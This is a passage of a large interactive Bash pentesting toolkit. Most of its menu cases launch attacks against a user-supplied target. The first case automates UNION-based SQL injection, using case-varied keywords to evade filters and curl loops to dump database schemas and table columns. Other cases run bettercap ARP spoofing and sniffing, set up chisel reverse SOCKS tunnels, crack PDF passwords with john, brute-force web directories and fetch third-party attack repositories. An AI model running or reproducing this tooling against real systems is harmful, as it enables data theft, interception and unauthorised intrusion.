			MOFF=("OFFSET" "OFFSEt" "OFFSeT" "OFFSet" "OFFsET" "OFFsEt" "OFFseT" "OFFset" "OFfSET" "OFfSEt" "OFfSeT" "OFfSet" "OFfsET" "OFfsEt" "OFfseT" "OFfset" "OfFSET" "OfFSEt" "OfFSeT" "OfFSet" "OfFsET" "OfFsEt" "OfFseT" "OfFset" "OffSET" "OffSEt" "OffSeT" "OffSet" "OffsET" "OffsEt" "OffseT" "Offset" "oFFSET" "oFFSEt" "oFFSeT" "oFFSet" "oFFsET" "oFFsEt" "oFFseT" "oFFset" "oFfSET" "oFfSEt" "oFfSeT" "oFfSet" "oFfsET" "oFfsEt" "oFfseT" "oFfset" "ofFSET" "ofFSEt" "ofFSeT" "ofFSet" "ofFsET" "ofFsEt" "ofFseT" "ofFset" "offSET" "offSEt" "offSeT" "offSet" "offsET" "offsEt" "offseT" "offset" "OFFOFFSETSET" "offoffsetset")
			MWHE=("WHERE" "WHERe" "WHErE" "WHEre" "WHeRE" "WHeRe" "WHerE" "WHere" "WhERE" "WhERe" "WhErE" "WhEre" "WheRE" "WheRe" "WherE" "Where" "wHERE" "wHERe" "wHErE" "wHEre" "wHeRE" "wHeRe" "wHerE" "wHere" "whERE" "whERe" "whErE" "whEre" "wheRE" "wheRe" "wherE" "where" "WHEWHERERE" "whewherere")
			MFRO=("FROM" "FROm" "FRoM" "FRom" "FrOM" "FrOm" "FroM" "From" "fROM" "fROm" "fRoM" "fRom" "frOM" "frOm" "froM" "from" "FRFROMOM" "frfromom")
			echo "A SQLinjection could be triggered, You can choose every statement to bypass"
			echo "Choose SELECT statement:"
			select VSEL in "${MSEL[@]}"
			do
				SELECT="$VSEL"
			break
			done
			echo "Choose UNION statement:"
			select VUNI in "${MUNI[@]}"
			do
				UNION="$VUNI"
			break
			done
			echo "Choose CONCAT statement:"
			select VCON in "${MCON[@]}"
			do
				CONCAT="$VCON"
			break
			done
			echo "Choose LIMIT statement:"
			select VLIM in "${MLIM[@]}"
			do
				LIMIT="$VLIM"
			break
			done
			echo "Choose OFFSET statement:"
			select VOFF in "${MOFF[@]}"
			do
				OFFSET="$VOFF"
			break
			done
			echo "Choose FROM statement:"
			select VFRO in "${MFRO[@]}"
			do
				FROM="$VFRO"
			break
			done
			echo "Choose WHERE statement:"
			select VWHE in "${MWHE[@]}"
			do
				WHERE="$VWHE"
			break
			done
			MSEL=""
			MUNI=""
			MCON=""
			MLIM=""
			MOFF=""
			MWHE=""
			MFRO=""
			echo "$PAR"" ""$UNION"" ""$SELECT"" version() -- -"
			curl -v -k -X POST -d "$PAR"" ""$UNION"" ""$SELECT"" version() -- -" "$TURL"
			for I in {1..9}
			do
				if [[ "$Q" == "" ]];
				then
					Q="$I"","
				else
					Q="$Q""$I"","
				fi
				echo "$PAR"" ""$UNION"" ""$SELECT"" ""$Q""version() -- -"
				curl -v -k -X POST -d "$PAR"" ""$UNION"" ""$SELECT ""$Q""version() -- -" "$TURL"
			done
			echo "Digit the position of version, if was the first occurence, digit 1, otherwise digit the position number ignoring other numbers"
			echo "'1,2,8.0.15', the position will be 3 (ignoring the other numbers)"
			read -p "(example, 1): " POS
			if [[ "$POS" != "" ]];
			then
				PES=""
				LMT="100"
				FST="100"
				echo "Digit the maximum number to try in LIMIT"
				read -p "(example, 50, default is 100): " TLMT
				if [[ "$TLMT" != "" ]];
				then
					LMT="$TLMT"
				fi
				echo "Digit the maximum number to try in OFFSET"
				read -p "(example, 50, default is 100): " TFST
				if [[ "$TFST" != "" ]];
				then
					FST="$TFST"
				fi
				if [[ $POS -gt 1 ]];
				then
					POS=$(($POS - 1))
					for O in $(seq 1 $POS)
					do
						PES="$PES"",""$O"
					done
					PES="$PES"","
					for A in $(seq 0 $LMT)
					do
						for B in $(seq 0 $FST)
						do
							echo "$PAR"" ""$UNION"" ""$SELECT"" ""$PES""$CONCAT""(TABLE_SCHEMA, \":\", TABLE_NAME, \":\", COLUMN_NAME, \"\") ""$FROM"" INFORMATION_SCHEMA.COLUMNS ""$WHERE"" TABLE_SCHEMA != 'Information_Schema' ""$LIMIT"" ""$A"" ""$OFFSET"" ""$B"" -- -"
							curl -v -k -X POST -d "$PAR"" ""$UNION"" ""$SELECT"" ""$PES""$CONCAT""(TABLE_SCHEMA, \":\", TABLE_NAME, \":\", COLUMN_NAME, \"\") ""$FROM"" INFORMATION_SCHEMA.COLUMNS ""$WHERE"" TABLE_SCHEMA != 'Information_Schema' ""$LIMIT"" ""$A"" ""$OFFSET"" ""$B"" -- -" "$TURL"
							##echo "$PAR"" ""$UNION"" ""$SELECT"" ""$PES""$CONCAT""(TABLE_SCHEMA, \":\", TABLE_NAME, \":\", COLUMN_NAME, \"\") ""$FROM"" INFORMATION_SCHEMA.COLUMNS ""$WHERE"" TABLE_SCHEMA != 'Information_Schema' ""$LIMIT"" ""$A"" ""$OFFSET"" ""$B"" -- -"
							##curl -v -k -X POST -d "$PAR"" ""$UNINON"" ""$SELECT"" ""$PES""$CONCAT""(TABLE_SCHEMA, \":\", TABLE_NAME, \":\", COLUMN_NAME, \"\") ""$FROM"" INFORMATION_SCHEMA.COLUMNS ""$LIMIT"" ""$A"" ""$OFFSET"" ""$B"" -- -" "$TURL"
						done
					done
				else
					for A in $(seq 0 $LMT)
					do
						for B in $(seq 0 $FST)
						do
							echo "$PAR"" ""$UNION"" ""$SELECT"" ""$CONCAT""(TABLE_SCHEMA, \":\", TABLE_NAME, \":\", COLUMN_NAME, \"\") ""$FROM"" INFORMATION_SCHEMA.COLUMNS ""$WHERE"" TABLE_SCHEMA != 'Information_Schema' ""$LIMIT"" ""$A"" ""$OFFSET"" ""$B"" -- -"
							curl -v -k -X POST -d "$PAR"" ""$UNION"" ""$SELECT"" ""$CONCAT""(TABLE_SCHEMA, \":\", TABLE_NAME, \":\", COLUMN_NAME, \"\") ""$FROM"" INFORMATION_SCHEMA.COLUMNS ""$WHERE"" TABLE_SCHEMA != 'Information_Schema' ""$LIMIT"" ""$A"" ""$OFFSET"" ""$B"" -- -" "$TURL"
							##echo "$PAR"" ""$UNION"" ""$SELECT"" ""$CONCAT""(TABLE_SCHEMA, \":\", TABLE_NAME, \":\", COLUMN_NAME, \"\") ""$FROM"" INFORMATION_SCHEMA.COLUMNS ""$LIMIT"" ""$A"" ""$OFFSET"" ""$B"" -- -"
							##curl -v -k -X POST -d "$PAR"" ""$UNION"" ""$SELECT"" ""$CONCAT""(TABLE_SCHEMA, \":\", TABLE_NAME, \":\", COLUMN_NAME, \"\") ""$FROM"" INFORMATION_SCHEMA.COLUMNS ""$LIMIT"" ""$A"" ""$OFFSET"" ""$B"" -- -" "$TURL"
						done
					done
				fi
				TBLN="0"
				while [[ "$TBLN" != "quit" ]];
				do
					echo "Digit the TABLE_NAME, the secondo record (TABLE_SCHEMA:TABLE_NAME:COLUMN_NAME)"
					read -p "(example, Employes, quit for exit): " TBLN
					if [[ "$TBLN" != "" ]];
					then
						if [[ "$TBLN" != "quit" ]];
						then
							echo "Digit the COLUMN_NAME, the secondo record (TABLE_SCHEMA:TABLE_NAME:COLUMN_NAME)"
							read -p "(example, Person, quit for exit): " CLMN
							if [[ "$CLMN" != "" ]];
							then
								if [[ "$CLMN" != "quit" ]];
								then
									curl -v -k -X POST -d "$PAR"" ""$UNION"" ""$SELECT"" ""$CONCAT""(""$CLMN"") ""$FROM"" ""$TBLN"" -- -" "$TURL"
								fi
							fi
						fi
					fi
				done
				PES=""
				POS=""
				UNION=""
				SELECT=""
				CONCAT=""
				FROM=""
				WHERE=""
				LIMIT=""
				OFFSET=""
			fi
		fi
	;;
	"2634")
		echo "Digit the Target URL"
		read -p "(example http://www.domain.com): " TURL
	;;
	"2635")
		NSEgo "Diverto/nse-log4shell"
	;;
	"2636")
		NSEgo "psc4re/NSE-scripts"
	;;
	"2637")
		NSEgo "hackertarget/nmap-nse-scripts"
	;;
	"2638")
		if [[ $(Warning) == "Y" ]];
		then
			NSEgo "hkm/nmap-nse-scripts"
		fi
	;;
	"2639")
		NSEgo "takeshixx/nmap-scripts"
	;;
	"2640")
		NSEgo "giterlizzi/nmap-log4shell"
	;;
	"2641")
		if [[ $(Warning) == "Y" ]];
		then
			NSEgo "4ARMED/nmap-nse-scripts"
		fi
	;;
	"2642")
		if [[ "$TIP" == "0.0.0.0" ]];
		then
			echo "Digit the Target IP"
			read -p "(example, 10.11.12.13): " TIP
		fi
		STTL=($(ping -c 1 "$TIP"|tr ' ' '\n'))
		for TTL in "${STTL[@]}"
		do
			if [[ "$TTL" == "ttl="* ]];
			then
				TTLV=$(echo -n "$TTL" | awk -F '=' '{print $2}')
				echo "ICMP Time To Live = ""$TTLV"
				if [[ $TTL -lt 128 && $TTLV -gt 63 ]];
				then
					echo "The Target OS could be Linux or Unix"
				elif [[ $TTL -gt 127 ]];
				then
					echo "The Target OS could be Windows"
				fi
			fi
		done
	;;
	"2643")
		ls | egrep '\.pdf$'
		echo "Digit a pdf file"
		read -e -p "(example, protected.pdf): " PDF
		if [[ -f $PDF ]];
		then
			echo "Digit a wordlist, if you digit default, it will be used default wordlist"
			read -e -p "(example, /usr/share/wordlist/rockyou.txt, default is default): " WRDL
			WRDF=""
			if [[ "$WRDL" != "default" ]];
			then
				if [[ -f $WRDL ]];
				then
					WRDF="--wordlist=""$WRDL"
				fi
			fi
			PTJ=$(locate pdf2john)
			if [[ "$PTJ" != "" ]];
			then
				if [[ -f $PTJ ]];
				then
					$PTJ "$PDF" > pdf-crack.john
					if [[ "$WRDF" == "" ]];
					then
						john pdf-crack.john
					else
						john pdf-crack.john "$WRDF"
					fi
					john --show pdf-crack.john
				fi
			fi
		fi
	;;
	"2644")
		Clona "kennbroorg/iKy"
	;;
	"2645")
		if [[ $(Warning) == "Y" ]];
		then
			Scarica "$ENTRAW""machine1337/userfinder/main/osint.sh"
		fi
	;;
	"2646")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "TheSpeedX/WhatScraper"
		fi
	;;
	"2647")
		Clona "MrLion7/Lmap"
	;;
	"2648")
		Clona "blackducksoftware/synopsys-detect"
	;;
	"2649")
		Clona "rm1984/IMAPLoginTester"
	;;
	"2650")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "CodeX-ID/Temp-mail"
		fi
	;;
	"2651")
		echo "Digit a gz compressed file to extract"
		read -e -p "(example, example.gz): " FLTR
		if [[ -f "$FLTR" ]];
		then
			gzip -d "$FLTR"
		fi
	;;
	"2652")
		if [[ -f chisel ]];
		then
			if [[ "$MPRT" == "" ]];
			then
				echo "Digit a port to listening the chisel client"
				read -p "(example, 8080): " MPRT
			fi
			sudo chisel server --socks5 --reverse --port $MPRT
		else
			echo "Digit the chisel release version"
			read -e -p "(example, chisel_1.7.7_linux_amd64): " CHSL
			if [[ -f $CHSL && "$CHSL" != "" ]];
			then
				if [[ "$MPRT" == "" ]];
				then
					echo "Digit a port to listening the chisel client"
					read -p "(example, 8080): " MPRT
				fi
				chmod +x ./$CHSL
				sudo ./$CHSL server --socks5 --reverse --port $MPRT
			fi
		fi
	;;
	"2653")
		if [[ "$TURL" == "" ]];
		then
			echo "WORDPRESS scan, Digit a taget URL"
			read -p "(example, https://www.target.com): " TURL
		fi
		if [[ -f $(which gobuster) ]];
		then
			GOB="gobuster"
		fi
		if [[ -f $(which wfuzz) ]];
		then
			WFZ="wfuzz"
		fi
		echo "Do You want use a specific tool or use wget/curl? Make your choice"
		echo "(default is wget/curl): "
		select RSP in "$GOB" "$WFZ" "wget/curl"
		do
			if [[ "$RSP" == "gobuster" ]];
			then
			for ELEM in "${GHWPL[@]}"
			do
				QUI=$(echo "$ELEM"|awk -F '/' '{print $NF}')
				Scarica "$SECL""$DISC""$ELEM" "$QUI"
				if [[ "$ANON" == "Enabled" ]];
				then
					gobuster dir -k -p "socks5://""$DEFANON" -w "./""$QUI" -u "$TURL"
				else
					gobuster dir -k -w "./""$QUI" -u "$TURL"
				fi
				done
			elif [[ "$RSP" == "wfuzz" ]];
			then
				for ELEM in "${GHWPL[@]}"
				do
					QUI=$(echo "$ELEM"|awk -F '/' '{print $NF}')
					Scarica "$SECL""$DISC""$ELEM" "$QUI"
					if [[ "$ANON" == "Enabled" ]];
					then
						wfuzz -p "$DEFANON"":socks5" -w "./""$QUI" -u "$TURL""/FUZZ"
					else
						wfuzz -w "./""$QUI" -u "$TURL""/FUZZ"
					fi
				done
			else
				for ELEM in "${GHWPL[@]}"
				do
					WDIRS=($(ScaricaWL "$SECL""$DISC""$ELEM"))
					for WDIR in "${WDIRS[@]}"
					do
						if [[ "$WDIR" != "/"* ]];
						then
							NWDIR="/""$WDIR"
						else
							NWDIR="$WDIR"
						fi
						Controlla "$TURL""$NWDIR"
					done
				done
			fi
			break
		done
	;;
	"2654")
		if [[ "$TURL" == "" ]];
		then
			echo "APACHE and TOMCAT scan, Digit a taget URL"
			read -p "(example, https://www.target.com): " TURL
		fi
		if [[ -f $(which gobuster) ]];
		then
			GOB="gobuster"
		fi
		if [[ -f $(which wfuzz) ]];
		then
			WFZ="wfuzz"
		fi
		echo "Do You want use a specific tool or use wget/curl? Make your choice"
		echo "(default is wget/curl): "
		select RSP in "$GOB" "$WFZ" "wget/curl"
		do
			if [[ "$RSP" == "gobuster" ]];
			then
				for ELEM in "${APACH[@]}"
				do
					QUI=$(echo "$ELEM"|awk -F '/' '{print $NF}')
					Scarica "$SECL""$DISC""$ELEM" "$QUI"
					if [[ "$ANON" == "Enabled" ]];
					then
						gobuster dir -k -p "socks5://""$DEFANON" -w "./""$QUI" -u "$TURL"
					else
						gobuster dir -k -w "./""$QUI" -u "$TURL"
					fi
				done
			elif [[ "$RSP" == "wfuzz" ]];
			then
				for ELEM in "${APACH[@]}"
				do
					QUI=$(echo "$ELEM"|awk -F '/' '{print $NF}')
					Scarica "$SECL""$DISC""$ELEM" "$QUI"
					if [[ "$ANON" == "Enabled" ]];
					then
						wfuzz -p "$DEFANON"":socks5" -w "./""$QUI" -u "$TURL""/FUZZ"
					else
						wfuzz -w "./""$QUI" -u "$TURL""/FUZZ"
					fi
				done
			else
				for ELEM in "${APACH[@]}"
				do
					WDIRS=($(ScaricaWL "$SECL""$DISC""$ELEM"))
					for WDIR in "${WDIRS[@]}"
					do
						if [[ "$WDIR" != "/"* ]];
						then
							NWDIR="/""$WDIR"
						else
							NWDIR="$WDIR"
						fi
						Controlla "$TURL""$NWDIR"
					done
				done
			fi
			break
		done
	;;
	"2655")
		if [[ "$TURL" == "" ]];
		then
			echo "DIRECTORIES scan, Digit a taget URL"
			read -p "(example, https://www.target.com): " TURL
		fi
		if [[ -f $(which gobuster) ]];
		then
			GOB="gobuster"
		fi
		if [[ -f $(which wfuzz) ]];
		then
			WFZ="wfuzz"
		fi
		echo "Do You want use a specific tool or use wget/curl? Make your choice"
		echo "(default is wget/curl): "
		select RSP in "$GOB" "$WFZ" "wget/curl"
		do
			if [[ "$RSP" == "gobuster" ]];
			then
				echo "Choose a directory list"
				select ELEM in $DIRLIST
				do
					QUI=$(echo "$ELEM"|awk -F '/' '{print $NF}')
					Scarica "$SECL""$DISC""$ELEM" "$QUI"
					if [[ "$ANON" == "Enabled" ]];
					then
						gobuster dir -k -p "socks5://""$DEFANON" -w "./""$QUI" -u "$TURL"
					else
						gobuster dir -k -w "./""$QUI" -u "$TURL"
					fi
					break
				done
			elif [[ "$RSP" == "wfuzz" ]];
			then
				select ELEM in $DIRLIST
				do
					QUI=$(echo "$ELEM"|awk -F '/' '{print $NF}')
					Scarica "$SECL""$DISC""$ELEM" "$QUI"
					if [[ "$ANON" == "Enabled" ]];
					then
						wfuzz -p "$DEFANON"":socks5" -w "./""$QUI" -u "$TURL""/FUZZ"
					else
						wfuzz -w "./""$QUI" -u "$TURL""/FUZZ"
					fi
					break
				done
			else
				select ELEM in $DIRLIST
				do
					WDIRS=($(ScaricaWL "$SECL""$DISC""$ELEM"))
					for WDIR in "${WDIRS[@]}"
					do
						if [[ "$WDIR" != "/"* ]];
						then
							NWDIR="/""$WDIR"
						else
							NWDIR="$WDIR"
						fi
						Controlla "$TURL""$NWDIR"
					done
					break
				done
			fi
		done
	;;
	"2656")
		if [[ -f $(which bettercap) ]];
		then
			if [[ "$TIP" == "" ]];
			then
				echo "Digit a target IP to spoof"
				read -p "(example, 192.168.1.10): " TIP
			fi
			bettercap -eval "set arp.spoof.target $TIP; arp.spoof on; net.probe on; net.sniff on"
		fi
	;;
	"2657")
		echo "Digit or paste a string to XOR"
		read -p "(example, gm\`fzih!ftx] |): " TXT
		if [[ "$TXT" != "" ]];
		then
			echo "Digit a value of XOR bitwise"
			read -p "(example, 0x29a): " SXOR
			if [[ "$SXOR" != "" ]];
			then
				echo -e "from pwn import *\n\ntxt=list(\"""$TXT""\")\nprint(txt)\no=0\narray=[]\nfor a in txt:\n\tarray.append(ord(a))\n\to=o+1\nxored = \"\"\nfor i in array:\n\txored += (chr(i ^ ""$SXOR""))\n\nprint(xored)"|python
			fi
		fi
	;;
	"2658")
		echo "Digit or paste a sequence of values to XOR"
		read -p "(example, 0x2c5,0x2ee,0x2aa): " TXT
		if [[ "$TXT" != "" ]];
		then
			echo "Digit a value of XOR bitwise"
			read -p "(example, 0x29a): " SXOR
			if [[ "$SXOR" != "" ]];
			then
				echo -e "from pwn import *\n\narray=[""$TXT""]\nxored = \"\"\nfor i in array:\n\txored += (chr(i ^ ""$SXOR""))\n\nprint(xored)"|python
			fi
		fi
	;;
	"2659")
		echo "Digit or paste a sequence of values to AND"
		read -p "(example, 0x2c5,0x2ee,0x2aa): " TXT
		if [[ "$TXT" != "" ]];
		then
			echo "Digit a value of AND bitwise"
			read -p "(example, 0x29a): " SAND
			if [[ "$SAND" != "" ]];
			then
				echo -e "from pwn import *\n\narray=[""$TXT""]\nxored = \"\"\nfor i in array:\n\txored += (chr(i & ""$SAND""))\n\nprint(xored)"|python
			fi
		fi
	;;
	"2660")
		echo "Digit or paste a sequence of values to OR"
		read -p "(example, 0x2c5,0x2ee,0x2aa): " TXT
		if [[ "$TXT" != "" ]];
		then
			echo "Digit a value of OR bitwise"
			read -p "(example, 0x29a): " SOR
			if [[ "$SOR" != "" ]];
			then
				echo -e "from pwn import *\n\narray=[""$TXT""]\nxored = \"\"\nfor i in array:\n\txored += (chr(i | ""$SOR""))\n\nprint(xored)"|python
			fi
		fi
	;;
	"2661")
		echo "Digit or paste a string to AND"
		read -p "(example, gm\`fzih!ftx] |): " TXT
		if [[ "$TXT" != "" ]];
		then
			echo "Digit a value of XOR bitwise"
			read -p "(example, 0x29a): " SAND
			if [[ "$SAND" != "" ]];
			then
				echo -e "from pwn import *\n\ntxt=list(\"""$TXT""\")\nprint(txt)\no=0\narray=[]\nfor a in txt:\n\tarray.append(ord(a))\n\to=o+1\nxored = \"\"\nfor i in array:\n\txored += (chr(i & ""$SAND""))\n\nprint(xored)"|python
			fi
		fi
	;;
	"2662")
		echo "Digit or paste a string to OR"
		read -p "(example, gm\`fzih!ftx] |): " TXT
		if [[ "$TXT" != "" ]];
		then
			echo "Digit a value of OR bitwise"
			read -p "(example, 0x29a): " SOR
			if [[ "$SOR" != "" ]];
			then
				echo -e "from pwn import *\n\ntxt=list(\"""$TXT""\")\nprint(txt)\no=0\narray=[]\nfor a in txt:\n\tarray.append(ord(a))\n\to=o+1\nxored = \"\"\nfor i in array:\n\txored += (chr(i | ""$SOR""))\n\nprint(xored)"|python
			fi
		fi
	;;
	"2663")
		echo "Digit a valid User-Agent or select from list, exit to quit the selection"
		select CHOICE in "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36" "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/98.0.4758.97 Mobile/15E148 Safari/604.1" "Mozilla/5.0 (iPad; CPU OS 15_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/98.0.4758.97 Mobile/15E148 Safari/604.1" "Mozilla/5.0 (iPod; CPU iPhone OS 15_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/98.0.4758.97 Mobile/15E148 Safari/604.1" "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36" "Mozilla/5.0 (Linux; Android 10; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36" "Mozilla/5.0 (Linux; Android 10; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0" "Mozilla/5.0 (Macintosh; Intel Mac OS X 12.2; rv:97.0) Gecko/20100101 Firefox/97.0" "Mozilla/5.0 (X11; Linux i686; rv:97.0) Gecko/20100101 Firefox/97.0" "Mozilla/5.0 (iPhone; CPU iPhone OS 12_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/97.0 Mobile/15E148 Safari/605.1.15" "Mozilla/5.0 (iPad; CPU OS 12_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/97.0 Mobile/15E148 Safari/605.1.15" "Mozilla/5.0 (iPod touch; CPU iPhone OS 12_2_1 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) FxiOS/97.0 Mobile/15E148 Safari/605.1.15" "Mozilla/5.0 (Android 12; Mobile; rv:68.0) Gecko/68.0 Firefox/97.0" "Mozilla/5.0 (Android 12; Mobile; LG-M255; rv:97.0) Gecko/97.0 Firefox/97.0" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0" "Mozilla/5.0 (Macintosh; Intel Mac OS X 12.2; rv:91.0) Gecko/20100101 Firefox/91.0" "Mozilla/5.0 (X11; Linux i686; rv:91.0) Gecko/20100101 Firefox/91.0" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 OPR/83.0.4254.27" "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 OPR/83.0.4254.27" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 OPR/83.0.4254.27" "Mozilla/5.0 (Linux; Android 10; VOG-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36 OPR/63.3.3216.58675" "Mozilla/5.0 (Linux; Android 10; SM-G970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36 OPR/63.3.3216.58675" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Brave Chrome/83.0.4103.116 Safari/537.36" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 Edg/97.0.1072.69" "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 Edg/97.0.1072.69" "Mozilla/5.0 (Linux; Android 10; HD1913) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36 EdgA/97.0.1072.69" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 EdgiOS/97.1072.69 Mobile/15E148 Safari/605.1.15" "Mozilla/5.0 (Windows Mobile 10; Android 10.0; Microsoft; Lumia 950XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Mobile Safari/537.36 Edge/40.15254.603" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 Edge/44.18363.8131" "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_2_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Mobile/15E148 Safari/604.1" "Mozilla/5.0 (iPad; CPU OS 15_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Mobile/15E148 Safari/604.1" "Mozilla/5.0 (iPod touch; CPU iPhone 15_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Mobile/15E148 Safari/604.1" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 Vivaldi/4.3" "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 Vivaldi/4.3" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 Vivaldi/4.3" "custom" "exit"
		do
			if [[ "$CHOICE" != "exit" ]];
			then
				if [[ "$CHOICE" == "custom" ]];
				then
					read -p "Digit a custom User-Agent: " USERAGENT
					if [[ "$USERAGENT" != "" ]];
					then
						USERAGENT=""
						USERAGENT="--user-agent \"""$USERAGENT""\""
					fi
				else
					USERAGENT=""
					USERAGENT="--user-agent \"""$CHOICE""\""
				fi
			fi
			break
		done
	;;
	"2664")
		echo "Digit header to add into array"
		while [[ "$HEADER" != "exit" ]];
		do
			HEADER=""
			read -p "(digit 'exit' to 'finish', reset to clear HEADERS, without quotes): " HEADER
			if [[ "$HEADER" == "exit" ]];
			then
				break
			elif [[ "$HEADER" == "reset" ]];
			then
				SHEADER=""
				HEADERS=("")
			else
				HEADERS+=("$HEADER")
			fi
		done
		for HDR in "${HEADERS[@]}"
		do
			if [[ "$SHEADER" != "" ]];
			then
				SHEADER="$SHEADER"" --header \"""$HDR""\""
			else
				SHEADER="--header \"""$HDR""\""
			fi
		done
	;;
	"2665")
		echo "Digit a valid Cookie value, dividing with semicolon ;"
		read -p "(example, ): " COOKIE
		if [[ "$COOKIE" != "" ]];
		then
			CCOOKIE=""
			CCOOKIE="-b \"""$COOKIE""\""
			WCOOKIE=""
			WCOOKIE="--keep-session-cookies --save-cookies cookies.txt"
		fi
	;;
	"AA")
		if [[ "$CAA" == "[+]" ]];
		then
			CAA="[-]"
		else
			CAA="[+]"
		fi
	;;
	"AB")
		if [[ "$CAB" == "[+]" ]];
		then
			CAB="[-]"
		else
			CAB="[+]"
		fi
	;;
	"AC")
		if [[ "$CAC" == "[+]" ]];
		then
			CAC="[-]"
		else
			CAC="[+]"
		fi
	;;
	"AD")
		if [[ "$CAD" == "[+]" ]];
		then
			CAD="[-]"
		else
			CAD="[+]"
		fi
	;;
	"AE")
		if [[ "$CAE" == "[+]" ]];
		then
			CAE="[-]"
		else
			CAE="[+]"
		fi
	;;
	"AF")
		if [[ "$CAF" == "[+]" ]];
		then
			CAF="[-]"
		else
			CAF="[+]"
		fi
	;;
	"AG")
		if [[ "$CAG" == "[+]" ]];
		then
			CAG="[-]"
		else
			CAG="[+]"
		fi
	;;
	"AH")
		if [[ "$CAH" == "[+]" ]];
		then
			CAH="[-]"
		else
			CAH="[+]"
		fi
	;;
	"AI")
		if [[ "$CAI" == "[+]" ]];
		then
			CAI="[-]"
		else
			CAI="[+]"
		fi
	;;
	"AJ")
		if [[ "$CAJ" == "[+]" ]];
		then
			CAJ="[-]"
		else
			CAJ="[+]"
		fi
	;;
	"AK")
		if [[ "$CAK" == "[+]" ]];
		then
			CAK="[-]"
		else
			CAK="[+]"
		fi
	;;
	"AL")
	if [[ "$CAL" == "[+]" ]];
	then
	CAL="[-]"
	else
		CAL="[+]"
		fi
		;;
	"AM")
	if [[ "$CAM" == "[+]" ]];
	then
	CAM="[-]"
	else
		CAM="[+]"
		fi
		;;
	"AN")
	if [[ "$CAN" == "[+]" ]];
	then
	CAN="[-]"
	else
		CAN="[+]"
		fi
		;;
	"AO")
	if [[ "$CAO" == "[+]" ]];
	then
	CAO="[-]"
	else
		CAO="[+]"
		fi
		;;
	"AP")
	if [[ "$CAP" == "[+]" ]];
	then
	CAP="[-]"
	else
		CAP="[+]"
		fi
		;;
	"AQ")
	if [[ "$CAQ" == "[+]" ]];
	then
	CAQ="[-]"
	else
		CAQ="[+]"
		fi
		;;
	"AR")
	if [[ "$CAR" == "[+]" ]];
	then
	CAR="[-]"
	else
		CAR="[+]"
		fi
		;;
	"AS")
	if [[ "$CAS" == "[+]" ]];
	then
	CAS="[-]"
	else
		CAS="[+]"
		fi
		;;
	"AT")
	if [[ "$CAT" == "[+]" ]];
	then
	CAT="[-]"
	else
		CAT="[+]"
		fi
		;;
	"AU")
	if [[ "$CAU" == "[+]" ]];
	then
	CAU="[-]"
	else
		CAU="[+]"
		fi
